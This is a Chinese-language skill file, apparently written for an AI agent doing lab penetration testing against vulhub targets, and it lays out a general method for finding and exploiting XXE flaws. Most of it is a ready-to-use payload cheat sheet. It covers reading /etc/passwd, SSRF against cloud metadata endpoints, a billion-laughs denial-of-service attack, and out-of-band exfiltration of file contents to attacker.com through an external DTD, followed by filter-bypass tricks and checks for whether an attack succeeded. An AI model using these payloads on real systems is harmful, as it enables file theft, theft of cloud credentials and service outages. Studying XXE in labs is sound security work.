---
name: vulhub-xxe
description: xxe 类型漏洞的通用抽象探测与利用方案
version: 1.0
---

# XXE 抽象化通用渗透与利用指南

## [1] 通用探测思路 (Detection Methodology)

XXE（XML外部实体注入）漏洞的核心在于应用程序在解析用户可控的XML数据时，错误地启用了外部实体引用功能。探测的关键在于识别所有可能接收和处理XML格式数据的入口点。

**抽象入口点识别：**
1.  **显式XML端点：** 寻找任何接受`Content-Type: application/xml`或`text/xml`的HTTP请求端点。这包括API接口、文件上传（如SVG、DOCX、XLSX等包含XML的格式）、数据导入/导出功能、SOAP Web服务以及RSS/Atom订阅源。
2.  **隐式XML解析：** 某些应用（如一些Java框架、文档处理库）可能在接收JSON、表单数据甚至特定文件格式时，在后台将其转换为XML进行处理。尝试将`Content-Type`从`application/json`改为`application/xml`，并发送格式化为XML的数据包进行测试。
3.  **参数污染与变形：** 在常规参数（如`?data=<value>`）中尝试提交以`<?xml`或`<!DOCTYPE`开头的字符串，观察解析器行为。同时，注意`GET`、`POST`、`Cookie`、`HTTP Header`等所有用户可控输入位置。
4.  **文件内容触发：** 对于文件上传功能，尝试上传包含恶意XML实体的SVG、PDF、DOCX、PPTX、XLSX等文件，观察服务器端解析行为。

**探测Payload设计原则：** 初始探测应使用无害但能验证解析器是否处理外部实体的Payload，例如引用一个不存在的内部DTD或一个指向可控服务器的HTTP URL，通过观察DNS查询或HTTP请求日志来确认漏洞存在。

## [2] 经典漏洞原型与 Payload 字典 (Cheat Sheet)

以下Payload已剥离具体应用上下文，按利用目标分类，可直接用于测试。

### 2.1 基础文件读取
用于读取服务器上的任意文件。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///path/to/sensitive/file">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;
]>
```

### 2.2 服务器端请求伪造 (SSRF)
利用XML解析器发起内部网络请求，探测或攻击内网服务。
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```
```xml
<!ENTITY xxe SYSTEM "http://internal.service.local/admin" >
```

### 2.3 拒绝服务攻击 (DoS)
利用XML实体扩展进行“亿级实体膨胀”攻击，消耗服务器资源。
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;">
]>
<root>&lol9;</root>
```

### 2.4 带外数据外带 (OOB - Out-of-Band)
当响应不直接回显数据时，通过HTTP或DNS协议将数据外带。
```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<root></root>
```
其中，`evil.dtd` 内容为：
```xml
<!ENTITY % exfil SYSTEM "http://attacker.com/collect?%file;">
%exfil;
```

## [3] 变体与特殊绕过技巧 (Bypass & Tricky Variants)

1.  **协议包装与重写：**
    *   `SYSTEM`关键字后可使用多种协议：`file://`、`http://`、`https://`、`ftp://`、`gopher://`、`dict://`、`php://filter/`（PHP环境）、`jar://`（Java环境）、`netdoc://`（Java环境）。
    *   **PHP Filter链：** 利用`php://filter/convert.base64-encode/resource=/etc/passwd`读取文件并Base64编码返回，可绕过某些字符显示限制。

2.  **编码绕过：**
    *   **HTML实体编码：** 将`<`、`>`、`&`等符号编码为`&lt;`、`&gt;`、`&amp;`，如果解析器进行二次解码，可能绕过简单过滤。
    *   **UTF编码：** 使用UTF-16BE/LE等编码格式的XML文件，可能绕过基于字符串匹配的WAF。
    *   **CDATA标签：** 尝试将Payload包裹在`<![CDATA[ ... ]]>`中。

3.  **DTD位置与声明方式：**
    *   **内部DTD子集：** 如上文示例，在`<!DOCTYPE [...]>`内直接声明。
    *   **外部DTD引用：** `<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">`。这在某些禁用内部实体但允许外部引用的配置下有效。
    *   **参数实体嵌套：** 利用`%`声明的参数实体进行多层嵌套，常用于构造OOB Payload或绕过字符限制。

4.  **上下文感知Payload：**
    *   如果XML被嵌入到JSON或其他格式中（例如`{"data": "<xml>...</xml>"}`），需确保整个XML字符串被正确转义以符合外层格式。
    *   在SOAP请求中，Payload需放置在合法的SOAP Body元素内。

5.  **针对特定解析库的“特性”：**
    *   某些旧版本的libxml2（如2.8.0）默认支持外部实体，无需特殊配置即可利用。
    *   一些文档格式（如DOCX）本质是ZIP包，其`[Content_Types].xml`或`*.rels`文件可能被解析，可在此处注入XXE。

## [4] 回显与成功判定基准 (Verification)

成功利用XXE漏洞的判定标准取决于攻击类型：

1.  **直接回显 (In-band)：**
    *   **文件读取：** 在HTTP响应体中直接出现目标文件内容，如包含`root:x:0:0:`等行的Linux `/etc/passwd`文件内容，或Windows系统文件的特定字符串。
    *   **SSRF：** 响应体中出现内网服务的响应内容，如云元数据信息、内网应用页面HTML、数据库错误信息等。
    *   **DoS：** 服务器响应时间极长、返回超时错误、或直接崩溃/重启。

2.  **带外回显 (OOB)：**
    *   **DNS查询验证：** 在Payload中使用`SYSTEM "http://subdomain.attacker.com/`或通过参数实体触发DNS查询。在攻击者控制的DNS服务器日志中观察到来自目标服务器的查询记录，**这是最可靠的低噪声探测方式**。
    *   **HTTP请求验证：** 在攻击者控制的Web服务器访问日志中，捕获到来自目标服务器的HTTP请求。请求中可能包含通过参数实体拼接的文件内容（如`/collect?file=base64...`）。
    *   **错误信息推断：** 如果请求一个不存在的内部文件或服务，解析器可能返回包含路径或主机名的错误信息（如“java.io.FileNotFoundException: /etc/shadow”），这同样可以证实漏洞存在及实体被解析。

**通用验证流程建议：**
1.  首先使用OOB DNS Payload进行无侵入探测，确认漏洞存在。
2.  根据业务场景，尝试读取`/etc/passwd`、`/proc/self/cwd/application.properties`、`C:\windows\win.ini`等无害但具有标志性的文件进行直接回显验证。
3.  最后再执行敏感文件读取或SSRF等深入利用操作。